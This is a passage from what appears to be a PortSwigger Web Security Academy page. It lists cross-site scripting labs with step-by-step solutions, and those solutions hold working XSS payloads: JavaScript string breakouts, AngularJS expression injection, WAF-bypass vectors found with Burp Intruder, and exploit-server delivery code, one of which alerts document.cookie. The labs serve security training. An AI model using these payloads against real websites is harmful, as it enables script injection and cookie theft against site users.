                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Post a comment with a random alphanumeric string in the "Website" input, then use
                                    Burp Suite to intercept the request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Make a second request in the browser to view the post and use Burp Suite to
                                    intercept the request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string in the second Repeater tab has been reflected inside
                                    an anchor
                                    <code>
        href
       </code>
                                    attribute.
                                </li>
                                <li>
                                    <p>
                                        Repeat the process again but this time replace your input with the following
                                        payload to inject a JavaScript URL that calls alert:
                                    </p>
                                    <code class="code-scrollable">
        javascript:alert(1)
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. Clicking the name above your comment should trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into a JavaScript string with angle brackets HTML encoded
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected cross-site scripting
                </a>
                vulnerability in the search query tracking functionality where angle brackets are encoded. The
                reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack
                that breaks out of the JavaScript string and calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/164e6fe824ef894ffa05160602259af63f6266c2e82f19714daf79a0be75e363?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-angle-brackets-html-encoded"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Submit a random alphanumeric string in the search box, then use Burp Suite to
                                    intercept the search request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string has been reflected inside a JavaScript string.
                                </li>
                                <li>
                                    <p>
                                        Replace your input with the following payload to break out of the JavaScript
                                        string and inject an alert:
                                    </p>
                                    <code class="code-scrollable">
        '-alert(1)-'
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. When you load the page it should trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                in
                <code>
   document.write
  </code>
                sink using source
                <code>
   location.search
  </code>
                inside a select element
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based cross-site scripting
                </a>
                vulnerability in the stock checker functionality. It uses the JavaScript
                <code>
   document.write
  </code>
                function, which writes data out to the page. The
                <code>
   document.write
  </code>
                function is called with data from
                <code>
   location.search
  </code>
                which you can control using the website URL. The data is enclosed within a select element.
            </p>
            <p>
                To solve this lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that breaks out of the select element and calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/20f0960254c2299d1e38d95c6131eed58e897552311335c61ea0c8d324d7ca71?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-document-write-sink-inside-select-element"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    On the product pages, notice that the dangerous JavaScript extracts a
                                    <code>
        storeId
       </code>
                                    parameter from the
                                    <code>
        location.search
       </code>
                                    source. It then uses
                                    <code>
        document.write
       </code>
                                    to create a new option in the select element for the stock checker functionality.
                                </li>
                                <li>
                                    Add a
                                    <code>
        storeId
       </code>
                                    query parameter to the URL and enter a random alphanumeric string as its value.
                                    Request this modified URL.
                                </li>
                                <li>
                                    In the browser, notice that your random string is now listed as one of the options
                                    in the drop-down list.
                                </li>
                                <li>
                                    Right-click and inspect the drop-down list to confirm that the value of your
                                    <code>
        storeId
       </code>
                                    parameter has been placed inside a select element.
                                </li>
                                <li>
                                    <p>
                                        Change the URL to include a suitable
                                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                                            XSS
                                        </a>
                                        payload inside the
                                        <code>
         storeId
        </code>
                                        parameter as follows:
                                    </p>
                                    <code class="code-scrollable">
        product?productId=1&amp;storeId="&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                in AngularJS expression with angle brackets and double quotes HTML-encoded
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based cross-site scripting
                </a>
                vulnerability in a
                <a
                    href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection">
                    AngularJS
                </a>
                expression within the search functionality.
            </p>
            <p>
                AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the
                <code>
   ng-app
  </code>
                attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can
                execute JavaScript expressions within double curly braces. This technique is useful when angle brackets
                are being encoded.
            </p>
            <p>
                To solve this lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that executes an AngularJS expression and calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/7dd0e73fe7cd3372360932722c0dfa1b3d73637170c9107ab1fb90c1ae2b4ae1?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-angularjs-expression"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Enter a random alphanumeric string into the search box.
                                </li>
                                <li>
                                    View the page source and observe that your random string is enclosed in an
                                    <code>
        ng-app
       </code>
                                    directive.
                                </li>
                                <li>
                                    <p>
                                        Enter the following AngularJS expression in the search box:
                                    </p>
                                    <code class="code-scrollable">
        {{$on.constructor('alert(1)')()}}
       </code>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        search
                                    </strong>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Reflected
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the
                server-side application processes data from a request and echoes the data in the response. A script on
                the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
            </p>
            <p>
                To solve this lab, create an injection that calls the
                <code>
   alert()
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/954173de38d3d0f6588c4a98d6400a1335a3ef78d9a8ce701a6609fb87941e96?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-dom-xss-reflected"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is
                                    switched on.
                                </li>
                                <li>
                                    Back in the lab, go to the target website and use the search bar to search for a
                                    random test string, such as
                                    <code>
        "XSS"
       </code>
                                    .
                                </li>
                                <li>
                                    Return to the Proxy tool in Burp Suite and forward the request.
                                </li>
                                <li>
                                    On the Intercept tab, notice that the string is reflected in a JSON response called
                                    <code>
        search-results
       </code>
                                    .
                                </li>
                                <li>
                                    From the Site Map, open the
                                    <code>
        searchResults.js
       </code>
                                    file and notice that the JSON response is used with an
                                    <code>
        eval()
       </code>
                                    function call.
                                </li>
                                <li>
                                    By experimenting with different search strings, you can identify that the JSON
                                    response is escaping quotation marks. However, backslash is not being escaped.
                                </li>
                                <li>
                                    <p>
                                        To solve this lab, enter the following search term:
                                    </p>
                                    <code class="code-scrollable">
        \"-alert(1)}//
       </code>
                                </li>
                            </ol>
                            <p>
                                As you have injected a backslash and the site isn't escaping them, when the JSON
                                response attempts to escape the opening double-quotes character, it adds a second
                                backslash. The resulting double-backslash causes the escaping to be effectively canceled
                                out. This means that the double-quotes are processed unescaped, which closes the string
                                that should contain the search term.
                            </p>
                            <p>
                                An arithmetic operator (in this case the subtraction operator) is then used to separate
                                the expressions before the
                                <code>
       alert()
      </code>
                                function is called. Finally, a closing curly bracket and two forward slashes close the
                                JSON object early and comment out what would have been the rest of the object. As a
                                result, the response is generated as follows:
                            </p>
                            <code class="code-scrollable">
      {"searchTerm":"\\"-alert(1)}//", "results":[]}
     </code>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Stored
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab,
                exploit this vulnerability to call the
                <code>
   alert()
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a2e1b73b9b37946f3a6b2d3bef063907db04eede2ec15f0b9c17518818b81ec8?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-dom-xss-stored"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Post a comment containing the following vector:
                            </p>
                            <code class="code-scrollable">
      &lt;&gt;&lt;img src=1 onerror=alert(1)&gt;
     </code>
                            <p>
                                In an attempt to prevent
                                <a href="https://portswigger.net/web-security/cross-site-scripting">
                                    XSS
                                </a>
                                , the website uses the JavaScript
                                <code>
       replace()
      </code>
                                function to encode angle brackets. However, when the first argument is a string, the
                                function only replaces the first occurrence. We exploit this vulnerability by simply
                                including an extra set of angle brackets at the beginning of the comment. These angle
                                brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling
                                us to effectively bypass the filter and inject HTML.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into HTML context with most tags and attributes blocked
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected XSS
                </a>
                vulnerability in the search functionality but uses a web application firewall (WAF) to protect against
                common XSS vectors.
            </p>
            <p>
                To solve the lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that bypasses the WAF and calls the
                <code>
   print()
  </code>
                function.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Your solution must not require any user interaction. Manually causing
                    <code>
    print()
   </code>
                    to be called in your own browser will not solve the lab.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/626e9e76c544af64db41c2723c8720ab0f25bf6f4c14b8d47c81a2790c472bad?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-html-context-with-most-tags-and-attributes-blocked"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Inject a standard XSS vector, such as:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src=1 onerror=print()&gt;
       </code>
                                </li>
                                <li>
                                    Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder
                                    to test which tags and attributes are being blocked.
                                </li>
                                <li>
                                    Open Burp's browser and use the search function in the lab. Send the resulting
                                    request to Burp Intruder.
                                </li>
                                <li>
                                    In Burp Intruder, in the Positions tab, replace the value of the search term with:
                                    <code>
        &lt;&gt;
       </code>
                                </li>
                                <li>
                                    Place the cursor between the angle brackets and click "Add Â§" twice, to create a
                                    payload position. The value of the search term should now look like:
                                    <code>
        &lt;Â§Â§&gt;
       </code>
                                </li>
                                <li>
                                    Visit the
                                    <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">
                                        XSS cheat sheet
                                    </a>
                                    and click "Copy tags to clipboard".
                                </li>
                                <li>
                                    In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into
                                    the payloads list. Click "Start attack".
                                </li>
                                <li>
                                    When the attack is finished, review the results. Note that all payloads caused an
                                    HTTP 400 response, except for the
                                    <code>
        body
       </code>
                                    payload, which caused a 200 response.
                                </li>
                                <li>
                                    <p>
                                        Go back to the Positions tab in Burp Intruder and replace your search term with:
                                    </p>
                                    <code class="code-scrollable">
        &lt;body%20=1&gt;
       </code>
                                </li>
                                <li>
                                    Place the cursor before the
                                    <code>
        =
       </code>
                                    character and click "Add Â§" twice, to create a payload position. The value of the
                                    search term should now look like:
                                    <code>
        &lt;body%20Â§Â§=1&gt;
       </code>
                                </li>
                                <li>
                                    Visit the
                                    <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">
                                        XSS cheat sheet
                                    </a>
                                    and click "copy events to clipboard".
                                </li>
                                <li>
                                    In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous
                                    payloads. Then click "Paste" to paste the list of attributes into the payloads list.
                                    Click "Start attack".
                                </li>
                                <li>
                                    When the attack is finished, review the results. Note that all payloads caused an
                                    HTTP 400 response, except for the
                                    <code>
        onresize
       </code>
                                    payload, which caused a 200 response.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following code, replacing
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your lab ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'&gt;
       </code>
                                </li>
                                <li>
                                    Click "Store" and "Deliver exploit to victim".
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into HTML context with all tags blocked except custom ones
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab blocks all HTML tags except custom ones.
            </p>
            <p>
                To solve the lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that injects a custom tag and automatically alerts
                <code>
   document.cookie
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/35d25a422af775cc93101fff0b686ae37e3ccb4844d3272061e090aa0c854ced?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-html-context-with-all-standard-tags-blocked"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following code, replacing
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your lab ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Click "Store" and "Deliver exploit to victim".
                                </li>
                            </ol>
                            <p>
                                This injection creates a custom tag with the ID
                                <code>
       x
      </code>
                                , which contains an
                                <code>
       onfocus
      </code>
                                event handler that triggers the
                                <code>
       alert
      </code>
                                function. The hash at the end of the URL focuses on this element as soon as the page is
                                loaded, causing the
                                <code>
       alert
      </code>
                                payload to be called.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                with some SVG markup allowed
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a simple
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected XSS
                </a>
                vulnerability. The site is blocking common tags but misses some SVG tags and events.
            </p>
            <p>
                To solve the lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that calls the
                <code>
   alert()
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/20812d5112754ad4d73aab3069147bf39635016f2005c5c0062a7e766fd72ffb?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-some-svg-markup-allowed"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Inject a standard XSS payload, such as:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src=1 onerror=alert(1)&gt;
       </code>
                                </li>
                                <li>
                                    Observe that this payload gets blocked. In the next few steps, we'll use Burp
                                    Intruder to test which tags and attributes are being blocked.
                                </li>
                                <li>
                                    Open Burp's browser and use the search function in the lab. Send the resulting
                                    request to Burp Intruder.
                                </li>
                                <li>
                                    In Burp Intruder, in the Positions tab, click "Clear Â§".
                                </li>
                                <li>
                                    In the request template, replace the value of the search term with:
                                    <code>
        &lt;&gt;
       </code>
                                </li>
                                <li>
                                    Place the cursor between the angle brackets and click "Add Â§" twice to create a
                                    payload position. The value of the search term should now be:
                                    <code>
        &lt;Â§Â§&gt;
       </code>
                                </li>
                                <li>
                                    Visit the
                                    <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">
                                        XSS cheat sheet
                                    </a>
                                    and click "Copy tags to clipboard".
                                </li>
                                <li>
                                    In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into
                                    the payloads list. Click "Start attack".
                                </li>
                                <li>
                                    When the attack is finished, review the results. Observe that all payloads caused an
                                    HTTP 400 response, except for the ones using the
                                    <code>
        &lt;svg&gt;
       </code>
                                    ,
                                    <code>
        &lt;animatetransform&gt;
       </code>
                                    ,
                                    <code>
        &lt;title&gt;
       </code>
                                    , and
                                    <code>
        &lt;image&gt;
       </code>
                                    tags, which received a 200 response.
                                </li>
                                <li>
                                    <p>
                                        Go back to the Positions tab in Burp Intruder and replace your search term with:
                                    </p>
                                    <code class="code-scrollable">
        &lt;svg&gt;&lt;animatetransform%20=1&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Place the cursor before the
                                        <code>
         =
        </code>
                                        character and click "Add Â§" twice to create a payload position. The value of the
                                        search term should now be:
                                    </p>
                                    <code class="code-scrollable">
        &lt;svg&gt;&lt;animatetransform%20Â§Â§=1&gt;
       </code>
                                </li>
                                <li>
                                    Visit the
                                    <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">
                                        XSS cheat sheet
                                    </a>
                                    and click "Copy events to clipboard".
                                </li>
                                <li>
                                    In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous
                                    payloads. Then click "Paste" to paste the list of attributes into the payloads list.
                                    Click "Start attack".
                                </li>
                                <li>
                                    <p>
                                        When the attack is finished, review the results. Note that all payloads caused
                                        an HTTP 400 response, except for the
                                        <code>
         onbegin
        </code>
                                        payload, which caused a 200 response.
                                    </p>
                                    <p>
                                        Visit the following URL in the browser to confirm that the alert() function is
                                        called and the lab is solved:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                in canonical link tag
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab reflects user input in a canonical link tag and escapes angle brackets.
            </p>
            <p>
                To solve the lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack on the home page that injects an attribute that calls the
                <code>
   alert
  </code>
                function.
            </p>
            <p>
                To assist with your exploit, you can assume that the simulated user will press the following key
                combinations:
            </p>
            <ul>
                <li>
                    <code class="code-scrollable">
    ALT+SHIFT+X
   </code>
                </li>
                <li>
                    <code class="code-scrollable">
    CTRL+ALT+X
   </code>
                </li>
                <li>
                    <code class="code-scrollable">
    Alt+X
   </code>
                </li>
            </ul>
            <p>
                Please note that the intended solution to this lab is only possible in Chrome.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/69d9a58b4be85fe3da0e5e65bb0b6655278492c77fce16b6989c5b40481c66ed?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-canonical-link-tag"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Visit the following URL, replacing
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your lab ID:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
       </code>
                                    <p>
                                        This sets the
                                        <code>
         X
        </code>
                                        key as an access key for the whole page. When a user presses the access key, the
                                        <code>
         alert
        </code>
                                        function is called.
                                    </p>
                                </li>
                                <li>
                                    To trigger the exploit on yourself, press one of the following key combinations:
                                    <ul>
                                        <li>
                                            On Windows:
                                            <code>
          ALT+SHIFT+X
         </code>
                                        </li>
                                        <li>
                                            On MacOS:
                                            <code>
          CTRL+ALT+X
         </code>
                                        </li>
                                        <li>
                                            On Linux:
                                            <code>
          Alt+X
         </code>
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into a JavaScript string with single quote and backslash escaped
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected cross-site scripting
                </a>
                vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript
                string with single quotes and backslashes escaped.
            </p>
            <p>
                To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and
                calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d926f2eb65b5882b27710e31d931b82bff5eccf019671ce0d921d6d23fd97442?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-single-quote-backslash-escaped"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Submit a random alphanumeric string in the search box, then use Burp Suite to
                                    intercept the search request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string has been reflected inside a JavaScript string.
                                </li>
                                <li>
                                    Try sending the payload
                                    <code>
        test'payload
       </code>
                                    and observe that your single quote gets backslash-escaped, preventing you from
                                    breaking out of the string.
                                </li>
                                <li>
                                    <p>
                                        Replace your input with the following payload to break out of the script block
                                        and inject a new script:
                                    </p>
                                    <code class="code-scrollable">
        &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. When you load the page it should trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected cross-site scripting
                </a>
                vulnerability in the search query tracking functionality where angle brackets and double are HTML
                encoded and single quotes are escaped.
            </p>
            <p>
                To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and
                calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
